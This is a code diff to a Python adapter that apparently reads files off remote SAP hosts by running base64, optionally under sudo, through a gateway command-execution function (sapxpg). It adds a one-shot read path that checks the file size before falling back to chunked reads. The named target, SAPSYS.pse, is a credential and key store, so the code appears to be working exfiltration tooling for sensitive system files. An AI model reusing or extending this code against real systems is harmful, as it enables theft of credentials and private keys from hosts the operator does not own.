@@ -481,6 +481,77 @@ def make_chunked_read_adapter(raw_exec_fn: GwExecFn,
         full_b64 = _b64_mod.b64encode(bytes(all_bytes)).decode("ascii")
         return {"success": True, "output": [full_b64], "error": ""}
 
+    # Kernels without the TLV output cap don't need chunking at all —
+    # a single `base64 <path>` returns the whole file.  Probing this
+    # once per adapter (a) picks it up automatically on older/patched
+    # kernels and (b) lets us short-circuit the 100+ chunk roundtrips
+    # that a 19 KB SAPSYS.pse otherwise costs.  Cached in a closure
+    # cell so subsequent reads on the same adapter reuse the verdict.
+    _fast_path_ok = [None]  # None = untested, True = usable, False = capped
+
+    def _try_full_read(file_path: str, use_sudo: bool) -> Optional[dict]:
+        """Attempt a single-shot `base64 <path>` and verify against
+        the real file size.  Returns the standard {success, output,
+        error} dict on success, or None when the output was truncated
+        (caller should fall back to chunked reads).
+
+        `_fast_path_ok` caches the verdict — once we've seen a
+        truncated response we don't reprobe for the rest of this
+        adapter's lifetime.
+        """
+        if _fast_path_ok[0] is False:
+            return None
+
+        program = "sudo" if use_sudo else "base64"
+        params = f"base64 {file_path}" if use_sudo else file_path
+        r = raw_exec_fn(program, params)
+        if not r.get("success"):
+            # Genuine failure (not just truncation) — don't disable
+            # the fast path forever; some paths need sudo, others don't.
+            return None
+
+        out_lines = _dedupe(r.get("output", []))
+        blob = "".join(ln.strip() for ln in out_lines)
+        if not blob:
+            return None
+        # Reject anything that smells like a shell error rather than
+        # a base64 payload (permission denied, no such file, etc.).
+        joined = "\n".join(out_lines)
+        if _looks_like_error(joined):
+            return None
+        try:
+            raw = _b64_mod.b64decode(blob, validate=True)
+        except Exception:
+            return None
+
+        # We need to know the real file size to prove nothing was
+        # truncated by the sapxpg TLV output cap.  _get_size costs
+        # one extra python roundtrip but only runs on the very first
+        # fast-path attempt of the adapter's lifetime.
+        real_size = _get_size(file_path)
+        if real_size < 0:
+            # Can't verify — safer to fall back to chunked than risk
+            # returning a silently-truncated file.
+            return None
+        if len(raw) != real_size:
+            # TLV output cap chopped the response.  Mark the fast
+            # path unusable and let the caller chunk.
+            _fast_path_ok[0] = False
+            print(f"  [chunked] fast-path {file_path}: "
+                  f"single-call base64 truncated "
+                  f"({len(raw)}B / {real_size}B) — "
+                  f"kernel enforces TLV output cap; "
+                  f"falling back to chunked reads for "
+                  f"the rest of this session")
+            return None
+
+        _fast_path_ok[0] = True
+        full_b64 = _b64_mod.b64encode(raw).decode("ascii")
+        print(f"  [chunked] fast-path {file_path}: "
+              f"{real_size}B in a single call "
+              f"(kernel has no TLV output cap — skipping chunking)")
+        return {"success": True, "output": [full_b64], "error": ""}
+
     def adapted(program: str, args: str) -> dict:
         is_base64 = program in ("base64", "/usr/bin/base64")
         is_sudo_base64 = (program == "sudo"
@@ -497,7 +568,14 @@ def make_chunked_read_adapter(raw_exec_fn: GwExecFn,
                     "error": ("sudo not NOPASSWD; "
                               "first attempt should succeed")}
 
-        return _read_chunked(args.strip(), use_sudo=False)
+        file_path = args.strip()
+
+        # Try one-shot base64 first on kernels without the TLV cap.
+        fast = _try_full_read(file_path, use_sudo=False)
+        if fast is not None:
+            return fast
+
+        return _read_chunked(file_path, use_sudo=False)
 
     return adapted
 
